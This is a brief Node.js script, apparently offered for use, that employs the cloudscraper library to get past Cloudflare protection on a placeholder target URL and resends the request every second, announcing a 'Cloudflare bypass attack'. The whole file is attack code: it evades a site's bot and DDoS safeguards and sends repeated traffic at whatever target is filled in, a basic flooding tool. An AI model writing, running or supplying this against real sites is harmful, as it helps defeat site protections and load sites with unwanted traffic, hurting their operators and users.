const cloudscraper = require('cloudscraper');

const target = 'https://example.com'; // Replace with target URL

function bypassCloudflare() {
    cloudscraper.get(target, (error, response, body) => {
        if (error) {
            console.log('Cloudflare bypass failed:', error.message);
        } else {
            console.log('Cloudflare bypass successful. Status code:', response.statusCode);
        }
    });
}

// Run bypass multiple times
setInterval(bypassCloudflare, 1000); // Repeat every 1 second
console.log(`Cloudflare bypass attack initiated on ${target}.`);